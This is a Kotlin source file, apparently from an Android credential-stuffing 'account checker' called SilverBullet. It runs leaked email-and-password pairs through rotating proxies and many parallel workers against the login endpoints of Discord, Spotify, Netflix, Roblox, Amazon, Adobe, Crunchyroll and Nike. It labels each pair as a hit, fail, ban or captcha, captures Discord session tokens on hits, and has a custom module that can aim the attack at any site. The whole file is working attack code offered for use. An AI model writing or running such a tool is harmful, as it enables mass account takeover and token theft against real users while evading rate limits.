package com.silverbullet.checker.core

import com.silverbullet.checker.models.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.net.InetSocketAddress
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicInteger
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class AccountChecker(private val config: CheckConfig) {

    private val client = buildClient()
    private val checkedCount = AtomicInteger(0)
    private var isRunning = false
    private var job: Job? = null

    private val _results = ConcurrentLinkedQueue<Account>()
    val results: List<Account> get() = _results.toList()

    var onResult: ((Account) -> Unit)? = null
    var onStatsUpdate: ((CheckStats) -> Unit)? = null

    private var stats = CheckStats()
    private var proxies = mutableListOf<Proxy>()
    private var currentProxyIndex = 0

    fun loadProxies(proxyList: List<Proxy>) {
        proxies = proxyList.toMutableList()
    }

    private fun buildClient(): OkHttpClient.Builder {
        return OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .followRedirects(false)
            .followSslRedirects(false)
    }

    private fun getOkHttpClient(): OkHttpClient {
        val builder = buildClient()
        if (config.useProxy && proxies.isNotEmpty()) {
            val proxy = getNextProxy()
            if (proxy != null) {
                val okProxy = when (config.proxyType) {
                    ProxyType.HTTP -> java.net.Proxy(java.net.Proxy.Type.HTTP, InetSocketAddress(proxy.ip, proxy.port))
                    ProxyType.SOCKS4, ProxyType.SOCKS5 -> java.net.Proxy(java.net.Proxy.Type.SOCKS, InetSocketAddress(proxy.ip, proxy.port))
                }
                builder.proxy(okProxy)
            }
        }
        return builder.build()
    }

    private fun getNextProxy(): Proxy? {
        if (proxies.isEmpty()) return null
        val activeProxies = proxies.filter { it.isActive && it.failCount < 5 }
        if (activeProxies.isEmpty()) return null
        currentProxyIndex = (currentProxyIndex + 1) % activeProxies.size
        return activeProxies[currentProxyIndex]
    }

    private fun reportProxyFailure(proxy: Proxy) {
        proxy.failCount++
        if (proxy.failCount >= 5) {
            proxy.isActive = false
        }
    }

    fun startChecking(combos: List<Combo>, scope: CoroutineScope) {
        if (isRunning) return
        isRunning = true
        stats.reset()
        stats.total = combos.size

        val semaphore = java.util.concurrent.Semaphore(config.threads)
        val comboQueue = ConcurrentLinkedQueue(combos)

        job = scope.launch(Dispatchers.IO) {
            val workers = (1..config.threads).map { workerId ->
                async {
                    while (isRunning && comboQueue.isNotEmpty()) {
                        val combo = comboQueue.poll() ?: break
                        semaphore.acquire()
                        try {
                            val result = checkAccount(combo)
                            _results.add(result)
                            stats.checked++
                            updateStats(result)
                            onResult?.invoke(result)
                        } finally {
                            semaphore.release()
                        }
                    }
                }
            }
            workers.awaitAll()
            isRunning = false
stats.cpm = stats.computeCpm()
            onStatsUpdate?.invoke(stats)
        }
    }

    fun stopChecking() {
        isRunning = false
        job?.cancel()
    }

    private suspend fun checkAccount(combo: Combo): Account {
        var lastError: Exception? = null
        var attempt = 0
        val maxAttempts = config.retries + 1

        while (attempt < maxAttempts) {
            attempt++
            try {
                return when (config.module) {
                    CheckModule.DISCORD -> checkDiscord(combo)
                    CheckModule.SPOTIFY -> checkSpotify(combo)
                    CheckModule.NETFLIX -> checkNetflix(combo)
                    CheckModule.GENERIC -> checkGeneric(combo)
                    CheckModule.ROBLOX -> checkRoblox(combo)
                    CheckModule.AMAZON -> checkAmazon(combo)
                    CheckModule.ADOBE -> checkAdobe(combo)
                    CheckModule.CRUNCHYROLL -> checkCrunchyroll(combo)
                    CheckModule.NIKE -> checkNike(combo)
                    CheckModule.CUSTOM -> checkCustom(combo)
                }
            } catch (e: Exception) {
                lastError = e
                attempt++
                if (attempt < maxAttempts) delay(1000)
            }
        }

        return Account(
            email = combo.email,
            password = combo.password,
            status = AccountStatus.ERROR,
            details = lastError?.message ?: "Unknown error"
        )
    }

    private suspend fun checkDiscord(combo: Combo): Account = suspendCoroutine { cont ->
        val json = """{"login":"${combo.email}","password":"${combo.password}","undelete":false,"login_source":"null","gift_code_sku_id":"null"}"""
        val body = json.toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("https://discord.com/api/v9/auth/login")
            .post(body)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Content-Type", "application/json")
            .header("Origin", "https://discord.com")
            .header("Referer", "https://discord.com/login")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                val bodyStr = response.body?.string() ?: ""
                response.close()

                val status = when (response.code) {
                    200 -> {
                        val token = try {
                            org.json.JSONObject(bodyStr).optString("token", "")
                        } catch (e: Exception) { "" }

                        if (token.isNotEmpty()) {
                            AccountStatus.HIT
                        } else {
                            AccountStatus.CAPTCHA
                        }
                    }
                    401 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    403 -> AccountStatus.CAPTCHA
                    500, 502, 503 -> AccountStatus.RETRY
                    else -> AccountStatus.ERROR
                }

                val details = when (status) {
                    AccountStatus.HIT -> {
                        try {
                            val json = org.json.JSONObject(bodyStr)
                            val token = json.optString("token", "")
                            "Token: ${token.take(50)}..."
                        } catch (e: Exception) { "Hit - token captured" }
                    }
                    AccountStatus.FAIL -> "Invalid credentials"
                    AccountStatus.BAN -> "Rate limited / IP banned"
                    AccountStatus.CAPTCHA -> "CAPTCHA / Phone verification"
                    else -> "HTTP ${response.code}"
                }

                cont.resume(createResult(combo, status, details))
            }
        })
    }

    private suspend fun checkSpotify(combo: Combo): Account = suspendCoroutine { cont ->
        val formBody = FormBody.Builder()
            .add("type", "sp ldap")
            .add("remember", "true")
            .add("countryCode", "US")
            .build()

        val auth = android.util.Base64.encodeToString(
            "${combo.email}:${combo.password}".toByteArray(),
            android.util.Base64.NO_WRAP
        )

        val request = Request.Builder()
            .url("https://accounts.spotify.com/api/login")
            .post(formBody)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Authorization", "Basic $auth")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                val bodyStr = response.body?.string() ?: ""
                response.close()

                val status = when {
                    response.code == 200 && !bodyStr.contains("INVALID_CREDENTIALS") -> AccountStatus.HIT
                    response.code == 429 -> AccountStatus.BAN
                    response.code == 401 -> AccountStatus.FAIL
                    bodyStr.contains("INVALID_CREDENTIALS") -> AccountStatus.FAIL
                    bodyStr.contains("CAPTCHA") -> AccountStatus.CAPTCHA
                    else -> AccountStatus.ERROR
                }

                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkGeneric(combo: Combo): Account = suspendCoroutine { cont ->
        val request = Request.Builder()
            .url(config.module.endpoint)
            .get()
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401, 403 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkNetflix(combo: Combo): Account = suspendCoroutine { cont ->
        val json = """{"email":"${combo.email}","password":"${combo.password}","rememberMe":false,"flow":"loginIdentifier","sessionData":{}}"""
        val body = json.toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("https://www.netflix.com/login")
            .post(body)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Content-Type", "application/json")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401, 403 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkRoblox(combo: Combo): Account = suspendCoroutine { cont ->
        val json = """{"ctype":"Email","cvalue":"${combo.email}","password":"${combo.password}"}"""
        val body = json.toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("https://auth.roblox.com/v2/login")
            .post(body)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Content-Type", "application/json")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                val bodyStr = response.body?.string() ?: ""
                response.close()

                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    403 -> AccountStatus.CAPTCHA
                    else -> AccountStatus.ERROR
                }

                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkAmazon(combo: Combo): Account = suspendCoroutine { cont ->
        val formBody = FormBody.Builder()
            .add("email", combo.email)
            .add("password", combo.password)
            .build()

        val request = Request.Builder()
            .url("https://www.amazon.com/ap/signin")
            .post(formBody)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when {
                    response.code == 200 && response.header("Location")?.contains("signin") != true -> AccountStatus.HIT
                    response.code == 429 -> AccountStatus.BAN
                    response.code == 200 -> AccountStatus.FAIL
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkAdobe(combo: Combo): Account = suspendCoroutine { cont ->
        val formBody = FormBody.Builder()
            .add("username", combo.email)
            .add("password", combo.password)
            .build()

        val request = Request.Builder()
            .url("https://ims-na1.adobelogin.com/ims/profile/v1/web")
            .post(formBody)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401, 403 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkCrunchyroll(combo: Combo): Account = suspendCoroutine { cont ->
        val request = Request.Builder()
            .url("https://www.crunchyroll.com/login")
            .get()
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkNike(combo: Combo): Account = suspendCoroutine { cont ->
        val request = Request.Builder()
            .url("https://api.nike.com/member/profile")
            .get()
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkCustom(combo: Combo): Account = suspendCoroutine { cont ->
        val url = config.customUrl.ifBlank { CheckModule.CUSTOM.endpoint }
        if (url.isEmpty()) {
            cont.resume(createResult(combo, AccountStatus.ERROR, "Custom module needs a URL"))
            return@suspendCoroutine
        }
        try {
            val method = config.customMethod.uppercase()
            val content = config.customBodyTemplate
                .replace("{email}", combo.email)
                .replace("{password}", combo.password)

            val builder = Request.Builder()
                .url(url)
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

            when (method) {
                "GET" -> builder.get()
                "PUT" -> builder.put(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
                "PATCH" -> builder.patch(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
                "DELETE" -> builder.delete(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
                else -> builder.post(
                    content.toRequestBody(config.customContentType.ifBlank { "application/json" }.toMediaType())
                )
            }

            getOkHttpClient().newCall(builder.build()).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
                }

                override fun onResponse(call: Call, response: Response) {
                    val bodyStr = response.body?.string() ?: ""
                    response.close()

                    val hasSuccess = config.customSuccessMarker.isNotBlank() && bodyStr.contains(config.customSuccessMarker)
                    val hasFail = config.customFailMarker.isNotBlank() && bodyStr.contains(config.customFailMarker)
                    val markersConfigured = config.customSuccessMarker.isNotBlank() || config.customFailMarker.isNotBlank()

                    val status = when {
                        hasSuccess -> AccountStatus.HIT
                        hasFail -> AccountStatus.FAIL
                        markersConfigured -> AccountStatus.FAIL
                        response.code == 200 || response.code == 201 || response.code == 204 -> AccountStatus.HIT
                        response.code == 401 || response.code == 403 -> AccountStatus.FAIL
                        response.code == 429 -> AccountStatus.BAN
                        response.code == 500 || response.code == 502 || response.code == 503 -> AccountStatus.RETRY
                        else -> AccountStatus.ERROR
                    }

                    val details = when (status) {
                        AccountStatus.HIT -> if (config.customSuccessMarker.isNotBlank()) {
                            "Marker: ${config.customSuccessMarker}"
                        } else {
                            "HTTP ${response.code}"
                        }
                        AccountStatus.FAIL -> if (config.customFailMarker.isNotBlank()) {
                            "Marker: ${config.customFailMarker}"
                        } else {
                            "HTTP ${response.code}"
                        }
                        else -> "HTTP ${response.code}"
                    }

                    cont.resume(createResult(combo, status, details))
                }
            })
        } catch (e: Exception) {
            cont.resume(createResult(combo, AccountStatus.ERROR, "Bad config: ${e.message}"))
        }
    }

    private fun createResult(combo: Combo, status: AccountStatus, details: String): Account {
        return Account(
            email = combo.email,
            password = combo.password,
            status = status,
            details = details
        )
    }

    private fun updateStats(result: Account) {
        when (result.status) {
            AccountStatus.HIT -> stats.hits++
            AccountStatus.FAIL -> stats.fails++
            AccountStatus.BAN -> stats.banned++
            AccountStatus.CAPTCHA -> stats.captcha++
            AccountStatus.RETRY -> stats.retries++
            AccountStatus.ERROR -> stats.errors++
            else -> {}
        }
        stats.cpm = stats.computeCpm()
        onStatsUpdate?.invoke(stats)
    }
}
